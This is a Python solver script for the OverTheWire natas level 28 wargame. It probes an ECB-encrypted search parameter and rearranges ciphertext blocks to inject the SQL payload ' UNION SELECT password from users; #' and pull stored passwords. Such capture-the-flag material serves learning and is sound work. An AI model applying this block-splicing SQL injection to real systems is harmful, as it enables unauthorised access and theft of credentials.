"""
Help script to resolve natas challenge #28
"""
import requests
import string
import json
import base64
import math

level = 'natas28'
url = 'http://{}.natas.labs.overthewire.org'.format(level)

with open('natas.json') as j:
    credentials = json.load(j)
auth = (level, credentials[level])
del credentials

"""
In this level we will have to decipher the contents of an (poorly) encrypted payload.
"""
session = requests.Session()
response = session.post(url, data={'query': 'natas29'}, auth=auth)
# We are redirected to the page with a GET parameter
# http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPIQ9i1qWcR%2BwgATYlCscOxBZIaVSupG%2B5Ppq4WEW09L0Nf%2FK3JUU%2FwpRwHlH118D44%3D
#
print('URL: ' + response.url)
# Seems to be URL-encoded
data = requests.utils.unquote(response.url.split('=')[1])
print('Data: ' + data)
# If we perform several queries, we can observe that one part of the encoded
# data is constant. This reveals that we are dealing with some sort of block
# cipher.
# To get more information about the encryption mechanism, we need the key
# length first.
# Determining the key length is easy: append characters until the next block is
# appended to the encrypted output.
def get_encrypted_data(input_string):
    response = session.post(url, data={'query': input_string}, auth=auth)
    return base64.b64decode(requests.utils.unquote(response.url.split('=')[1]))


response_length = len(base64.b64decode(data))
temp = 'natas29a'
temp_length = len(get_encrypted_data(temp))
while response_length == temp_length:
    temp += 'a'
    temp_length = len(get_encrypted_data(temp))
block_size = temp_length - response_length
print('Block size: ' + str(block_size))
# If we break apart the encrypted stream in segments of the size of the
# cipher-block, we realize that the first two blocks are always the same.
# The third block varies, but we know that if our input exceeds the 9 chars,
# a new block is required.
# We can try and add some padding to our message, to guess the last character
# of the 3rd block.
# Example:
# |       1       |       2       |        3      |
# 1234567890abcdef1234567890abcdef123456aaaaaaaaaX
sample = get_encrypted_data('a' * 9)
for c in string.printable:
    # Third block spans from
    if sample[block_size*2:block_size*3-1] == get_encrypted_data('a' * 9 + c)[block_size*2:block_size*3-1]:
        print('Found ' + c)
        break
else:
    print('Could not determine char.')
# We have seen the character "%". The odds are that the query is some SQL statement
# that compares strings using something like:
# SELECT text from jokes where text LIKE '%string%'
# We tried to input quotes, but they seem to be filtered. That means we might use our
# padding again to push the original quotes out of the third block, and inject some
# extra blocks.
injection = 'a' * 9 + '\' UNION SELECT password from users; #'
blocks = math.ceil((len(injection)-10)/block_size)  # How many blocks our payload takes (without padding).
# Now we can pretty much encode whatever we want; let's encode our injection, and then encode a request
# long enough to fill a complete block, and then put our malicious bytes there.
encrypted_injection = get_encrypted_data(injection)
placeholder = get_encrypted_data('a' * 10)
# Some byte-cutting and pasting.
query = placeholder[:block_size*3] + encrypted_injection[block_size*3:block_size*3+(blocks*block_size)] + placeholder[block_size*3:]
response = session.get(url + '/search.php?query=' + requests.utils.quote(base64.b64encode(query)).replace('/', '%2F'),
                       auth=auth)
print(response.text)
# Finally ...
